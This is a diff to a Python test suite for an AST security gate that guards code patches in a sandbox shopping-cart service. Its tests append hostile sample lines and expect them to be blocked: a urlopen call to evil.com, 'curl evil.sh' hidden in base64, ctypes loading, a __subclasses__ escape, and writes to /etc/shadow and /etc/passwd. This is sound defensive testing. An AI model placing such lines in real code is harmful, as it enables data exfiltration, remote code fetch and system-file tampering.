@@ -452,14 +452,241 @@ def suite_3_adversarial_and_ast_bypass() -> dict:
         proc_benign = run_cmd([CLI_BIN, "verify-diff", SANDBOX_DIR])
         is_pass = (proc_benign.returncode == 0)
         out_benign = json.loads(proc_benign.stdout) if proc_benign.stdout.strip().startswith("{") else {}
-        all_rules_pass = len(out_benign.get("rules", [])) == 10 and all(r.get("status") == "PASS" for r in out_benign.get("rules", []))
+        all_rules_pass = len(out_benign.get("rules", [])) == 16 and all(r.get("status") == "PASS" for r in out_benign.get("rules", []))
         zero_findings = len(out_benign.get("forbidden_findings", [])) == 0
 
         if is_pass and all_rules_pass and zero_findings:
             log_pass("AST Guard: Benign Comment Immunity (Zero False Positives)", "Exit 0 (PASS) on benign comments with forbidden keywords (0 false positives)", (time.perf_counter() - sub_mut_t0)*1000)
             results.append(True)
         else:
-            log_fail("AST Guard: Benign Comment Immunity (Zero False Positives)", f"Expected rc=0 and 10 PASS rules, got rc={proc_benign.returncode}, findings={out_benign.get('forbidden_findings')}")
+            log_fail("AST Guard: Benign Comment Immunity (Zero False Positives)", f"Expected rc=0 and 16 PASS rules, got rc={proc_benign.returncode}, findings={out_benign.get('forbidden_findings')}")
+            results.append(False)
+    finally:
+        with open(CART_SERVICE_PY, "w") as f:
+            f.write(orig_cart_code)
+        run_cmd(["git", "-C", SANDBOX_DIR, "checkout", "HEAD", "--", "cart_service.py"])
+
+    # 3.12 AST Guard: Network Exfiltration Blocked (AST-SEC-10)
+    def apply_net_exfil():
+        with open(CART_SERVICE_PY, "a") as f:
+            f.write("\nimport urllib.request as u\nu.urlopen('http://evil.com/exfil')\n")
+    results.append(test_mutation("Network Exfiltration Blocked", CART_SERVICE_PY, apply_net_exfil, "AST-SEC-10: NO_NETWORK_EXFILTRATION", 2))
+
+    # 3.13 AST Guard: Benign Math Import Allowed
+    sub_mut_t0 = time.perf_counter()
+    with open(CART_SERVICE_PY, "r") as f:
+        orig_cart_code = f.read()
+    try:
+        with open(CART_SERVICE_PY, "w") as f:
+            f.write(orig_cart_code.replace("total = subtotal - 100.0", "import math\n        total = float(math.ceil(max(0.0, subtotal - 100.0)))"))
+        proc_math = run_cmd([CLI_BIN, "verify-diff", SANDBOX_DIR])
+        if proc_math.returncode == 0:
+            log_pass("AST Guard: Benign Math Import Allowed", "Exit 0 (PASS) on standard math import from allowlist", (time.perf_counter() - sub_mut_t0)*1000)
+            results.append(True)
+        else:
+            log_fail("AST Guard: Benign Math Import Allowed", f"Expected rc=0, got {proc_math.returncode}: {proc_math.stdout}")
+            results.append(False)
+    finally:
+        with open(CART_SERVICE_PY, "w") as f:
+            f.write(orig_cart_code)
+        run_cmd(["git", "-C", SANDBOX_DIR, "checkout", "HEAD", "--", "cart_service.py"])
+
+    # 3.14 AST Guard: Native Unsafe Loading Blocked (AST-SEC-11)
+    def apply_ctypes():
+        with open(CART_SERVICE_PY, "a") as f:
+            f.write("\nimport ctypes\nctypes.\\\n    CDLL(None)\n")
+    results.append(test_mutation("Native Unsafe Loading Blocked", CART_SERVICE_PY, apply_ctypes, "AST-SEC-11: NO_NATIVE_UNSAFE_LOADING", 2))
+
+    # 3.15 AST Guard: Benign Dataclass Import Allowed
+    sub_mut_t0 = time.perf_counter()
+    with open(CART_SERVICE_PY, "r") as f:
+        orig_cart_code = f.read()
+    try:
+        with open(CART_SERVICE_PY, "w") as f:
+            f.write("from dataclasses import dataclass\n" + orig_cart_code)
+        proc_dc = run_cmd([CLI_BIN, "verify-diff", SANDBOX_DIR])
+        if proc_dc.returncode == 0:
+            log_pass("AST Guard: Benign Dataclass Import Allowed", "Exit 0 (PASS) on dataclasses import from allowlist", (time.perf_counter() - sub_mut_t0)*1000)
+            results.append(True)
+        else:
+            log_fail("AST Guard: Benign Dataclass Import Allowed", f"Expected rc=0, got {proc_dc.returncode}: {proc_dc.stdout}")
+            results.append(False)
+    finally:
+        with open(CART_SERVICE_PY, "w") as f:
+            f.write(orig_cart_code)
+        run_cmd(["git", "-C", SANDBOX_DIR, "checkout", "HEAD", "--", "cart_service.py"])
+
+    # 3.16 AST Guard: Introspection Escape Blocked (AST-SEC-12)
+    def apply_introspection():
+        with open(CART_SERVICE_PY, "a") as f:
+            f.write("\nx = ().__class__.__subclasses__()\n")
+    results.append(test_mutation("Introspection Escape Blocked", CART_SERVICE_PY, apply_introspection, "AST-SEC-12: NO_INTROSPECTION_ESCAPES", 2))
+
+    # 3.17 AST Guard: Benign Attribute Access Allowed
+    sub_mut_t0 = time.perf_counter()
+    with open(CART_SERVICE_PY, "r") as f:
+        orig_cart_code = f.read()
+    try:
+        with open(CART_SERVICE_PY, "w") as f:
+            f.write(orig_cart_code.replace("total = subtotal - 100.0", "items.clear()\n        total = 0.0"))
+        proc_attr = run_cmd([CLI_BIN, "verify-diff", SANDBOX_DIR])
+        if proc_attr.returncode == 0:
+            log_pass("AST Guard: Benign Attribute Access Allowed", "Exit 0 (PASS) on standard method calls (items.clear)", (time.perf_counter() - sub_mut_t0)*1000)
+            results.append(True)
+        else:
+            log_fail("AST Guard: Benign Attribute Access Allowed", f"Expected rc=0, got {proc_attr.returncode}: {proc_attr.stdout}")
+            results.append(False)
+    finally:
+        with open(CART_SERVICE_PY, "w") as f:
+            f.write(orig_cart_code)
+        run_cmd(["git", "-C", SANDBOX_DIR, "checkout", "HEAD", "--", "cart_service.py"])
+
+    # 3.18 AST Guard: Filesystem Write & Sensitive Path Blocked (AST-SEC-13)
+    def apply_fs_write():
+        with open(CART_SERVICE_PY, "a") as f:
+            f.write("\nwith open('/etc/shadow', 'w') as f: f.write('pwn')\n")
+    results.append(test_mutation("Filesystem Write & Path Traversal Blocked", CART_SERVICE_PY, apply_fs_write, "AST-SEC-13: NO_UNSAFE_FS_ACCESS", 2))
+
+    # 3.19 AST Guard: Benign Safe Arithmetic Allowed
+    sub_mut_t0 = time.perf_counter()
+    with open(CART_SERVICE_PY, "r") as f:
+        orig_cart_code = f.read()
+    try:
+        with open(CART_SERVICE_PY, "w") as f:
+            f.write(orig_cart_code.replace("total = subtotal - 100.0", "total = round(max(0.0, float(subtotal - 100.0)), 2)"))
+        proc_arith = run_cmd([CLI_BIN, "verify-diff", SANDBOX_DIR])
+        if proc_arith.returncode == 0:
+            log_pass("AST Guard: Benign Safe Arithmetic Allowed", "Exit 0 (PASS) on clamping and round arithmetic", (time.perf_counter() - sub_mut_t0)*1000)
+            results.append(True)
+        else:
+            log_fail("AST Guard: Benign Safe Arithmetic Allowed", f"Expected rc=0, got {proc_arith.returncode}: {proc_arith.stdout}")
+            results.append(False)
+    finally:
+        with open(CART_SERVICE_PY, "w") as f:
+            f.write(orig_cart_code)
+        run_cmd(["git", "-C", SANDBOX_DIR, "checkout", "HEAD", "--", "cart_service.py"])
+
+    # 3.20 AST Guard: Staged Base64 Payload Blocked (AST-SEC-14)
+    def apply_staged_payload():
+        with open(CART_SERVICE_PY, "a") as f:
+            f.write("\nimport base64\nbase64.b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oImN1cmwgZXZpbC5zaCIp')\n")
+    results.append(test_mutation("Staged Base64 Payload Blocked", CART_SERVICE_PY, apply_staged_payload, "AST-SEC-14: NO_STAGED_PAYLOADS", 2))
+
+    # 3.21 AST Guard: Benign String Formatting Allowed
+    sub_mut_t0 = time.perf_counter()
+    with open(CART_SERVICE_PY, "r") as f:
+        orig_cart_code = f.read()
+    try:
+        with open(CART_SERVICE_PY, "w") as f:
+            f.write(orig_cart_code.replace("total = subtotal - 100.0", "summary = f'Total calculation: {subtotal}'\n        total = max(0.0, subtotal - 100.0)"))
+        proc_str = run_cmd([CLI_BIN, "verify-diff", SANDBOX_DIR])
+        if proc_str.returncode == 0:
+            log_pass("AST Guard: Benign String Formatting Allowed", "Exit 0 (PASS) on standard f-strings and formatting", (time.perf_counter() - sub_mut_t0)*1000)
+            results.append(True)
+        else:
+            log_fail("AST Guard: Benign String Formatting Allowed", f"Expected rc=0, got {proc_str.returncode}: {proc_str.stdout}")
+            results.append(False)
+    finally:
+        with open(CART_SERVICE_PY, "w") as f:
+            f.write(orig_cart_code)
+        run_cmd(["git", "-C", SANDBOX_DIR, "checkout", "HEAD", "--", "cart_service.py"])
+
+    # 3.22 AST Guard: Import Allowlist Blocked (AST-SEC-15)
+    def apply_unauthorized_import():
+        with open(CART_SERVICE_PY, "a") as f:
+            f.write("\nimport zlib\n")
+    results.append(test_mutation("Import Allowlist Blocked", CART_SERVICE_PY, apply_unauthorized_import, "AST-SEC-15: IMPORT_ALLOWLIST", 2))
+
+    # 3.23 AST Guard: Benign Allowlisted Import Allowed
+    sub_mut_t0 = time.perf_counter()
+    with open(CART_SERVICE_PY, "r") as f:
+        orig_cart_code = f.read()
+    try:
+        with open(CART_SERVICE_PY, "w") as f:
+            f.write("from decimal import Decimal\n" + orig_cart_code)
+        proc_dec = run_cmd([CLI_BIN, "verify-diff", SANDBOX_DIR])
+        if proc_dec.returncode == 0:
+            log_pass("AST Guard: Benign Allowlisted Import Allowed", "Exit 0 (PASS) on decimal import from allowlist", (time.perf_counter() - sub_mut_t0)*1000)
+            results.append(True)
+        else:
+            log_fail("AST Guard: Benign Allowlisted Import Allowed", f"Expected rc=0, got {proc_dec.returncode}: {proc_dec.stdout}")
+            results.append(False)
+    finally:
+        with open(CART_SERVICE_PY, "w") as f:
+            f.write(orig_cart_code)
+        run_cmd(["git", "-C", SANDBOX_DIR, "checkout", "HEAD", "--", "cart_service.py"])
+
+    # 3.24 AST Guard: Docstring Immunity (Zero False Positives)
+    sub_mut_t0 = time.perf_counter()
+    with open(CART_SERVICE_PY, "r") as f:
+        orig_cart_code = f.read()
+    try:
+        docstring_patch = (
+            "\ndef benign_docstring_fix():\n"
+            "    \"\"\"\n"
+            "    Security Architecture Note:\n"
+            "    Do not import urllib, ctypes, pickle, or execute /etc/shadow or eval().\n"
+            "    \"\"\"\n"
+            "    return True\n"
+        )
+        with open(CART_SERVICE_PY, "a") as f:
+            f.write(docstring_patch)
+        proc_doc = run_cmd([CLI_BIN, "verify-diff", SANDBOX_DIR])
+        if proc_doc.returncode == 0:
+            log_pass("AST Guard: Docstring Immunity (Zero False Positives)", "Exit 0 (PASS) on multiline docstring with sensitive keywords", (time.perf_counter() - sub_mut_t0)*1000)
+            results.append(True)
+        else:
+            log_fail("AST Guard: Docstring Immunity (Zero False Positives)", f"Expected rc=0, got {proc_doc.returncode}: {proc_doc.stdout}")
+            results.append(False)
+    finally:
+        with open(CART_SERVICE_PY, "w") as f:
+            f.write(orig_cart_code)
+        run_cmd(["git", "-C", SANDBOX_DIR, "checkout", "HEAD", "--", "cart_service.py"])
+
+    # 3.25 AST Guard: Property-Style Mutation Fuzzing
+    sub_mut_t0 = time.perf_counter()
+    base_attacks = [
+        "import os; os.system('curl evil.sh')",
+        "import urllib.request as u; u.urlopen('http://evil.com')",
+        "import ctypes; ctypes.CDLL(None)",
+        "x = ().__class__.__subclasses__()",
+        "open('/etc/passwd', 'w')",
+    ]
+    mutation_variants = [
+        lambda s: s.replace(";", "\n"),
+        lambda s: s.replace(";", "\n    "),
+        lambda s: s.replace(" ", "   "),
+        lambda s: s.replace(".", " . \\\n    "),
+        lambda s: "# comment\n" + s + "\n# trailing",
+    ]
+    all_fuzz_blocked = True
+    fuzz_count = 0
+    with open(CART_SERVICE_PY, "r") as f:
+        orig_cart_code = f.read()
+    try:
+        for attack in base_attacks:
+            for mut in mutation_variants:
+                try:
+                    mutated = mut(attack)
+                except Exception:
+                    continue
+                with open(CART_SERVICE_PY, "a") as f:
+                    f.write("\n" + mutated + "\n")
+                fuzz_res = run_cmd([CLI_BIN, "verify-diff", SANDBOX_DIR])
+                if fuzz_res.returncode != 2:
+                    all_fuzz_blocked = False
+                    log_fail("AST Guard: Property-Style Mutation Fuzzing", f"Mutant bypassed gate: {mutated!r}")
+                    break
+                fuzz_count += 1
+                with open(CART_SERVICE_PY, "w") as f:
+                    f.write(orig_cart_code)
+                run_cmd(["git", "-C", SANDBOX_DIR, "checkout", "HEAD", "--", "cart_service.py"])
+            if not all_fuzz_blocked:
+                break
+        if all_fuzz_blocked:
+            log_pass("AST Guard: Property-Style Mutation Fuzzing", f"All {fuzz_count} property-mutated attack snippets blocked with exit 2", (time.perf_counter() - sub_mut_t0)*1000)
+            results.append(True)
+        else:
             results.append(False)
     finally:
         with open(CART_SERVICE_PY, "w") as f:
@@ -591,8 +818,19 @@ def suite_5_integration_and_rollback() -> dict:
             log_fail("Triage Initialization (INC-9999)", f"Triage failed: {triage_proc.stderr}")
             results.append(False)
 
-        # 5.2 Apply valid surgical patch in sandbox-app
+        # 5.2 Apply valid surgical patch in sandbox-app (including TDD reproduction test)
         sub_t0 = time.perf_counter()
+        with open(TEST_CART_PY, "r") as f:
+            orig_test_code = f.read()
+        repro_test = (
+            "\ndef test_inc_9999_flat100_under_100_reproduction():\n"
+            "    items = [{'price': 40.0, 'quantity': 1}]\n"
+            "    assert calculate_cart_total(items, discount_code='FLAT100') == 0.0\n"
+        )
+        if repro_test not in orig_test_code:
+            with open(TEST_CART_PY, "a") as f:
+                f.write(repro_test)
+
         with open(CART_SERVICE_PY, "r") as f:
             orig_code = f.read()
         fixed_code = orig_code.replace("total = subtotal - 100.0", "total = max(0.0, subtotal - 100.0)")
